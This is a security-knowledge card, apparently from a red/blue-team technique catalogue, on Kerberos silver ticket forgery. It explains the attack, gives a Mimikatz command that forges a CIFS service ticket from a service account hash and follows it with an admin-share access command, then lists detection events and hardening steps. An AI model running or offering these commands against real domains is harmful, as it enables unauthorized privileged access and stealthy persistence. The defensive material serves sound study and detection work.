# [CA-KERB-004]: Silver Ticket Forgery

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-004 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets: Silver Ticket (T1558.002)](https://attack.mitre.org/techniques/T1558/002/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Forging a Service Ticket (TGS) using the NTLM hash of a specific Service Account (e.g., SQL Service, CIFS/Machine Account). The DC is *not* involved in validating this ticket; only the target service validates it. This allows an attacker to bypass the KDC entirely and access the specific service as any user (e.g., Domain Admin).
- **Attack Surface:** Any service using Kerberos where the account hash is compromised.
- **Business Impact:** **Service Persistence**. Stealthy access to specific resources (File Shares, Databases) without interacting with the DC (no 4769 logs on DC).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Target Service Account Hash.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Impacket (ticketer.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Forging the Ticket**
Forge a ticket for the `CIFS` service on a target server to gain file system access.
```powershell
# /target: The FQDN of the server
# /service: The SPN class (cifs, http, mssql)
# /rc4: The NTLM hash of the machine account (or service account)
kerberos::golden /user:Admin /domain:target.local /sid:S-1-5-21-XXX /target:server.target.local /service:cifs /rc4:HASH /ptt
```

**Step 2: Access**
```cmd
dir \\server.target.local\c$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security (Target Host)** | 4624 | Logon Type 3 (Network), Account Name matches forged user, but *no* corresponding 4769 on the DC. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Rotation:** Rotate Service Account passwords (and Machine Account passwords) frequently.
*   **PAC Validation:** Enforce PAC Validation (Registry: `ValidateKdcPacSignature`) so services check with the DC if the ticket is valid.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-KERB-001] (Kerberoasting)
> **Next Logical Step:** [LAT-SMB-001]
